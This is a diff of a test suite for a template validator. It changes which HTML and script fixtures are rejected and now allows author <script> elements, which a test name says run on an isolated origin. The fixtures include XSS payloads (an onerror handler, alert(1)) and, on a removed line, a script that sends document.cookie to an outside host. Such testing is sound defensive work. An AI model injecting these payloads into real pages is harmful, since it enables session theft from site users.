@@ -218,7 +218,7 @@ describe('renderTemplate — Handlebars features', () => {
   });
 
   it('VALIDATES partial sources too (an unsafe partial is rejected, not just the main template)', () => {
-    const c: TemplateContext = { partials: { evil: '<script>steal()</script>' } };
+    const c: TemplateContext = { partials: { evil: '<img src="x" onerror="steal()">' } };
     expect(() => renderTemplate('<div>{{> evil}}</div>', c)).toThrow(TemplateError);
   });
 
@@ -815,12 +815,14 @@ describe('validateTemplate — no tenant JS + URL scheme (security-review fixes)
   const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
   const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();
 
-  it('rejects a <script> element even with no interpolation', () => {
-    rejects('<p>hi</p><script>alert(1)</script>');
+  it('ALLOWS a <script> element (author JS; runs only on the isolated published origin) — body is rawtext', () => {
+    allows('<p>hi</p><script>alert(1)</script>');
+    allows('{{#*inline "x"}}<script>fetch("/api/x")</script>{{/inline}}{{> x}}'); // inline-partial body too
+    allows('<script>var s = "</style> not a tag"; if (a < b) foo();</script>'); // `<`/tags in JS are inert (rawtext)
   });
 
-  it('rejects a <script> hidden inside an {{#*inline}} partial body (the inline-partial bypass)', () => {
-    rejects('{{#*inline "x"}}<script>fetch("//e/"+document.cookie)</script>{{/inline}}{{> x}}');
+  it('still rejects a Handlebars {{interpolation}} inside a <script> (no server-data-into-JS injection)', () => {
+    rejects('<script>var x = {{ page.secret }};</script>');
   });
 
   it('rejects inline on* event-handler attributes (literal or interpolated)', () => {
